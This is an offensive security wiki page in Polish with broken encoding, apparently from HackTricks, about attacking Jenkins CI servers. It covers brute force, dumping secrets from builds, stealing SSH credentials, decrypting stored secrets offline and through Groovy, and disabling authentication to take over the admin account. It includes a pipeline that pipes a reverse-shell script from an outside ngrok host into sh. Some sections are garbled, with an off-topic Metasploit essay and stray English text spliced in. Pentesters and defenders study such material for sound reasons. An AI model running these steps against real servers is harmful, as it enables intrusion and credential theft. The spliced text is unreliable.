# Bezpieczestwo Jenkinsa

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

Jenkins to narzdzie, kt贸re oferuje prosty spos贸b na utworzenie rodowiska **cigej integracji** lub **cigego dostarczania** (CI/CD) dla prawie **dowolnej** kombinacji **jzyk贸w programowania** i repozytori贸w kodu 藕r贸dowego za pomoc potok贸w. Ponadto, automatyzuje r贸偶ne rutynowe zadania zwizane z rozwojem. Chocia偶 Jenkins nie eliminuje **koniecznoci tworzenia skrypt贸w dla poszczeg贸lnych krok贸w**, zapewnia szybszy i bardziej niezawodny spos贸b integracji caej sekwencji narzdzi do budowania, testowania i wdra偶ania ni偶 mo偶na to atwo zrobi rcznie.


{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Nieuwierzytelniona enumeracja

Aby wyszuka interesujce strony Jenkinsa bez uwierzytelnienia, takie jak (_/people_ lub _/asynchPeople_, kt贸re wywietlaj aktualnych u偶ytkownik贸w), mo偶na u偶y:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
Sprawd藕, czy mo偶esz wykonywa polecenia bez koniecznoci uwierzytelniania:
```
msf> use auxiliary/scanner/http/jenkins_command
```
Bez powiadcze dostpu mo偶na zajrze do cie偶ki _**/asynchPeople/**_ lub _**/securityRealm/user/admin/search/index?q=**_ w celu znalezienia **nazw u偶ytkownik贸w**.

Mo偶esz r贸wnie偶 uzyska wersj Jenkinsa z cie偶ki _**/oops**_ lub _**/error**_

![](<../../.gitbook/assets/image (48).png>)

### Znane podatnoci

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Logowanie

W podstawowych informacjach mo偶esz sprawdzi **wszystkie sposoby logowania do Jenkinsa**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Rejestracja

Mo偶esz znale藕 instancje Jenkinsa, kt贸re **umo偶liwiaj utworzenie konta i zalogowanie si do nich. Tak proste to jest.**

### **Logowanie SSO**

Jeli **funkcjonalno SSO**/**wtyczki** byy obecne, powiniene spr贸bowa **zalogowa si** do aplikacji za pomoc konta testowego (np. testowego konta **Github/Bitbucket**). Trik z [**tutaj**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Bruteforce

**Jenkins** nie posiada **polityki hasa** ani **zabezpiecze przed brutalnymi atakami na nazwy u偶ytkownik贸w**. Wa偶ne jest, aby **przeprowadzi brutalne ataki** na u偶ytkownik贸w, poniewa偶 mog by u偶ywane **sabe hasa** lub **nazwy u偶ytkownik贸w jako hasa**, nawet **odwr贸cone nazwy u偶ytkownik贸w jako hasa**.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

U偶yj [tego skryptu python](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py) lub [tego skryptu powershell](https://github.com/chryzsh/JenkinsPasswordSpray).

### Bypassowanie biaej listy adres贸w IP

Wiele organizacji czy **systemy zarzdzania kontrol 藕r贸de oparte na chmurze (SaaS)**, takie jak GitHub lub GitLab, z **wewntrznym, samodzielnym systemem CI**, takim jak Jenkins lub TeamCity. Taka konfiguracja pozwala systemom CI **odbiera zdarzenia webhook od dostawc贸w kontrolowania 藕r贸de w chmurze**, g贸wnie w celu uruchamiania zada w potoku.

Aby to osign, organizacje **umieszczaj na biaej licie** **zakresy adres贸w IP** **platform SCM**, pozwalajc im na dostp do **wewntrznego systemu CI** za pomoc **webhook贸w**. Jednak wa偶ne jest zauwa偶enie, 偶e **ka偶dy** mo偶e utworzy **konto** na GitHub lub GitLab i skonfigurowa je w celu **wywoania webhooka**, potencjalnie wysyajc 偶dania do **wewntrznego systemu CI**.

Sprawd藕:
[shttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## Nadu偶ycia wewntrznego Jenkinsa

W tych scenariuszach zakadamy, 偶e masz wa偶ne konto do dostpu do Jenkinsa.

{% hint style="warning" %}
W zale偶noci od skonfigurowanego mechanizmu **Autoryzacji** w Jenkinsie i uprawnie skompromitowanego u偶ytkownika **mo偶esz lub nie mo偶esz wykona poni偶sze ataki**.
{% endhint %}

Aby uzyska wicej informacji, sprawd藕 podstawowe informacje:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Wywietlanie u偶ytkownik贸w

Jeli uzyskasz dostp do Jenkinsa, mo偶esz wywietli innych zarejestrowanych u偶ytkownik贸w pod adresem [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Wyciekanie bud贸w w celu znalezienia jawnych sekret贸w

U偶yj [tego skryptu](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py), aby wycign dane z konsoli budowy i zmienne rodowiskowe budowy, w nadziei na znalezienie jawnych sekret贸w.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **Kradzie偶 danych uwierzytelniajcych SSH**

Jeli skompromitowany u偶ytkownik ma **wystarczajce uprawnienia do tworzenia/modyfikowania nowego wza Jenkins** i dane uwierzytelniajce SSH s ju偶 przechowywane w celu uzyskania dostpu do innych wz贸w, mo偶e **ukra te dane uwierzytelniajce** poprzez utworzenie/modyfikacj wza i **ustawienie hosta, kt贸ry zarejestruje dane uwierzytelniajce** bez weryfikacji klucza hosta:

![](<../../.gitbook/assets/image (56).png>)

Zazwyczaj dane uwierzytelniajce SSH Jenkins znajduj si w **globalnym dostawcy** (`/credentials/`), wic mo偶na je r贸wnie偶 wydoby tak samo jak inne tajne informacje. Wicej informacji w sekcji [**Wydobywanie tajemnic**](./#dumping-secrets).

### **RCE w Jenkins**

Uzyskanie **powoki na serwerze Jenkins** daje atakujcemu mo偶liwo ujawnienia wszystkich **tajemnic** i **zmiennych rodowiskowych** oraz **wykorzystania innych maszyn** znajdujcych si w tej samej sieci lub nawet **uzyskania powiadcze chmury**.

Domylnie Jenkins bdzie **dziaa jako SYSTEM**. Skompromitowanie go da atakujcemu **uprawnienia SYSTEMU**.

### **RCE Tworzenie/Modyfikowanie projektu**

Tworzenie/Modyfikowanie projektu to spos贸b na uzyskanie RCE na serwerze Jenkins:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE Wykonanie skryptu Groovy**

Mo偶na r贸wnie偶 uzyska RCE wykonujc skrypt Groovy, co mo偶e by bardziej dyskretne ni偶 tworzenie nowego projektu:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE Tworzenie/Modyfikowanie potoku

Mo偶na r贸wnie偶 uzyska **RCE poprzez tworzenie/modyfikowanie potoku**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Eksploatacja potoku

Aby wykorzysta potoki, nadal musisz mie dostp do Jenkinsa.

### Budowanie potok贸w

**Potoki** mog r贸wnie偶 by u偶ywane jako **mechanizm budowy w projektach**, w takim przypadku mo偶na skonfigurowa **plik wewntrz repozytorium**, kt贸ry zawiera skadni potoku. Domylnie u偶ywany jest `/Jenkinsfile`:

![](<../../.gitbook/assets/image (14) (1) (1).png>)

Mo偶liwe jest r贸wnie偶 **przechowywanie plik贸w konfiguracyjnych potoku w innych miejscach** (na przykad w innych repozytoriach) w celu **oddzielenia** dostpu do repozytorium **od dostpu do potoku**.

Jeli atakujcy ma **uprawnienia do zapisu w tym pliku**, bdzie m贸g go **modyfikowa** i **potencjalnie uruchomi** potok bez koniecznoci dostpu do Jenkinsa.\
Mo偶e by konieczne **obejcie niekt贸rych zabezpiecze gazi** (w zale偶noci od platformy i uprawnie u偶ytkownika, mog by one obejciane lub nie).

Najczstsze sposoby uruchamiania niestandardowego potoku to:

* **Pull request** do g贸wnej gazi (lub potencjalnie do innych gazi)
* **Push do g贸wnej gazi** (lub potencjalnie do innych gazi)
* **Aktualizacja g贸wnej gazi** i oczekiwanie, a偶 zostanie wykonana w jaki spos贸b

{% hint style="info" %}
Jeli jeste **zewntrznym u偶ytkownikiem**, nie powiniene oczekiwa, 偶e bdziesz m贸g utworzy **PR do g贸wnej gazi** repozytorium **innego u偶ytkownika/organizacji** i **uruchomi potok**... ale jeli jest **藕le skonfigurowany**, mo偶esz w peni **skompromitowa firmy, wykorzystujc to**.
{% endhint %}

### RCE potoku

W poprzedniej sekcji RCE ju偶 wskazano technik [**uzyskania RCE poprzez modyfikacj potoku**](./#rce-creating-modifying-pipeline).

### Sprawdzanie zmiennych rodowiskowych

Mo偶na zadeklarowa **zmienne rodowiskowe w postaci tekstu jawnego** dla caego potoku lub dla konkretnych etap贸w. Te zmienne rodowiskowe **nie powinny zawiera poufnych informacji**, ale atakujcy zawsze mo偶e **sprawdzi wszystkie konfiguracje potoku**/Jenkinsfiles:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Wyciekanie tajemnic

Aby uzyska informacje na temat tego, jak zazwyczaj traktowane s tajemnice przez Jenkinsa, zapoznaj si z podstawowymi informacjami:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Powiadczenia mog by **ograniczone do globalnych dostawc贸w** (`/credentials/`) lub do **konkretnych projekt贸w** (`/job/<nazwa-projektu>/configure`). Dlatego, aby wydoby wszystkie z nich, musisz **skompromitowa co najmniej wszystkie projekty**, kt贸re zawieraj tajemnice, i wykona niestandardowe/zatrute potoki.

Jest jeszcze jeden problem, aby uzyska **tajemnic w rodowisku** potoku, musisz **zna nazw i typ tajemnicy**. Na przykad, jeli spr贸bujesz **zaadowa** tajemnic **`usernamePassword`** jako tajemnic **`string`**, otrzymasz ten **bd**:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Oto spos贸b na zaadowanie niekt贸rych powszechnych typ贸w sekret贸w:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
Na kocu tej strony mo偶esz **znale藕 wszystkie typy powiadcze**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
Najlepszym sposobem na **wyciek wszystkich sekret贸w naraz** jest **skompromitowanie** maszyny **Jenkinsa** (na przykad uruchomienie odwr贸conego powoki w **wbudowanym w藕le**) a nastpnie **wyciek** **kluczy g贸wnych** i **zaszyfrowanych sekret贸w**, a nastpnie ich odszyfrowanie offline.\
Wicej na ten temat w sekcji [Wzy i Agenci](./#nodes-and-agents) oraz w sekcji [Eksploatacja po wamaniu](./#post-exploitation).
{% endhint %}

### Wyzwalacze

Z [dokumentacji](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): Dyrektywa `triggers` definiuje **automatyczne sposoby ponownego uruchamiania potoku**. Dla potok贸w zintegrowanych z takimi 藕r贸dami jak GitHub lub BitBucket, `triggers` mog nie by konieczne, poniewa偶 integracja oparta na webhookach jest ju偶 prawdopodobnie obecna. Obecnie dostpne wyzwalacze to `cron`, `pollSCM` i `upstream`.

Przykad cron:
```bash
triggers { cron('H */4 * * 1-5') }
```
Sprawd藕 **inne przykady w dokumentacji**.

### Wzy i agenci

Instancja **Jenkinsa** mo偶e mie **r贸偶ne agenty dziaajce na r贸偶nych maszynach**. Z perspektywy atakujcego, dostp do r贸偶nych maszyn oznacza **r贸偶ne potencjalne powiadczenia chmury** do kradzie偶y lub **r贸偶ny dostp do sieci**, kt贸ry mo偶na wykorzysta do atakowania innych maszyn.

Aby uzyska wicej informacji, sprawd藕 podstawowe informacje:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Mo偶esz wyliczy **skonfigurowane wzy** w `/computer/`, zazwyczaj znajdziesz tam \*\*`Wbudowany wze` \*\* (kt贸ry jest wzem uruchamiajcym Jenkinsa) i potencjalnie wicej:

![](<../../.gitbook/assets/image (25).png>)

Szczeg贸lnie interesujce jest **skompromitowanie wbudowanego wza**, poniewa偶 zawiera on wra偶liwe informacje o Jenkinsie.

Aby wskaza, 偶e chcesz **uruchomi** potok **w wbudowanym w藕le Jenkinsa**, mo偶esz okreli w potoku nastpujc konfiguracj:
```bash
pipeline {
agent {label 'built-in'}
```
### Peny przykad

Potok w okrelonym agentcie, z wyzwalaczem cron, zmiennymi rodowiskowymi dla potoku i etapu, adowanie 2 zmiennych w kroku i wysyanie odwr贸conej powoki:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
Metasploit jest jednym z najpopularniejszych narzdzi do testowania penetracyjnego. Jest to framework, kt贸ry umo偶liwia badaczom bezpieczestwa przeprowadzanie atak贸w na systemy komputerowe w celu identyfikacji luk w zabezpieczeniach. Metasploit oferuje szeroki zakres modu贸w i exploit贸w, kt贸re mog by wykorzystane do zdobywania dostpu do system贸w, przechwytywania danych, eskalacji uprawnie i wielu innych cel贸w.

Metasploit skada si z dw贸ch g贸wnych komponent贸w: Metasploit Framework i Metasploit Pro. Metasploit Framework jest darmow i otwarto藕r贸dow wersj, kt贸ra jest dostpna dla wszystkich. Metasploit Pro jest patnym narzdziem, kt贸re oferuje dodatkowe funkcje i wsparcie techniczne.

Metasploit Framework oferuje wiele modu贸w, kt贸re mog by wykorzystane do przeprowadzania atak贸w. Moduy te s napisane w jzyku Ruby i mog by atwo dostosowywane do konkretnych potrzeb badacza. Metasploit Framework obsuguje wiele r贸偶nych typ贸w atak贸w, takich jak ataki na protokoy sieciowe, ataki na aplikacje internetowe, ataki na systemy operacyjne i wiele innych.

Metasploit Pro jest bardziej rozbudowan wersj narzdzia, kt贸ra oferuje dodatkowe funkcje, takie jak automatyzacja atak贸w, zarzdzanie projektami, raportowanie i wiele innych. Metasploit Pro jest czsto wykorzystywany przez profesjonalnych tester贸w penetracyjnych i zespoy bezpieczestwa, kt贸rzy potrzebuj zaawansowanych funkcji i wsparcia technicznego.

Metasploit jest narzdziem pot偶nym i skutecznym, ale nale偶y pamita, 偶e jego u偶ycie powinno by legalne i zgodne z obowizujcymi przepisami. Przed u偶yciem Metasploit nale偶y uzyska odpowiednie uprawnienia i zezwolenia.
```
msf> post/multi/gather/jenkins_gather
```
### Sekrety Jenkinsa

Mo偶esz wywietli list sekret贸w, uzyskujc dostp do `/credentials/`, jeli masz wystarczajce uprawnienia. Nale偶y jednak zauwa偶y, 偶e zostan wywietlone tylko sekrety znajdujce si w pliku `credentials.xml`, ale **pliki konfiguracyjne budowy** mog zawiera **wicej danych uwierzytelniajcych**.

Jeli mo偶esz **zobaczy konfiguracj ka偶dego projektu**, mo偶esz tam r贸wnie偶 zobaczy **nazwy u偶ywanych danych uwierzytelniajcych (sekret贸w)** do dostpu do repozytorium i **innych danych uwierzytelniajcych projektu**.

![](<../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)

#### Za pomoc Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### Z dysku

Do **odszyfrowania sekret贸w Jenkinsa** s potrzebne nastpujce pliki:

* secrets/master.key
* secrets/hudson.util.Secret

Takie **sekrety zazwyczaj mo偶na znale藕 w**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Oto wyra偶enie regularne, kt贸re pozwoli je znale藕:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Odszyfruj tajemnice Jenkins offline

Jeli masz zrzut **potrzebnych hase do odszyfrowania tajemnic**, u偶yj [**tego skryptu**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **do odszyfrowania tych tajemnic**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Odszyfrowywanie tajemnic Jenkins z Groovy

Jenkins allows you to store sensitive information, such as passwords or API keys, as encrypted secrets. These secrets are stored in the Jenkins credentials plugin and can be accessed using Groovy scripts.

To decrypt Jenkins secrets from Groovy, you can use the `hudson.util.Secret` class. This class provides methods to encrypt and decrypt secrets.

Here's an example of how you can decrypt a Jenkins secret using Groovy:

```groovy
import hudson.util.Secret

def encryptedSecret = "your-encrypted-secret"
def decryptedSecret = Secret.decrypt(encryptedSecret).getPlainText()

println(decryptedSecret)
```

In the above example, replace `"your-encrypted-secret"` with the actual encrypted secret you want to decrypt. The `Secret.decrypt()` method decrypts the secret and returns a `Secret` object. You can then use the `getPlainText()` method to retrieve the decrypted secret as plain text.

Keep in mind that you need the appropriate permissions to access the Jenkins credentials plugin and decrypt secrets. Additionally, make sure to handle the decrypted secrets securely to avoid any potential leaks.

By using this technique, you can easily decrypt Jenkins secrets from Groovy scripts and perform necessary operations with the decrypted values.
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Utw贸rz nowego administratora

1. Uzyskaj dostp do pliku config.xml Jenkinsa w lokalizacji `/var/lib/jenkins/config.xml` lub `C:\Program Files (x86)\Jenkis\`.
2. Wyszukaj sowo `<useSecurity>true</useSecurity>` i zmie sowo **`true`** na **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Uruchom ponownie** serwer **Jenkinsa**: `service jenkins restart`.
4. Teraz przejd藕 ponownie do portalu Jenkinsa i tym razem **Jenkins nie bdzie prosi o 偶adne powiadczenia**. Przejd藕 do sekcji "**Zarzdzaj Jenkins**", aby ponownie ustawi haso administratora.
5. **Wcz** ponownie **bezpieczestwo**, zmieniajc ustawienia na `<useSecurity>true</useSecurity>` i **ponownie uruchom Jenkinsa**.

## Odwoania

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Uzyskaj [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi trikami hakerskimi, przesyajc PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
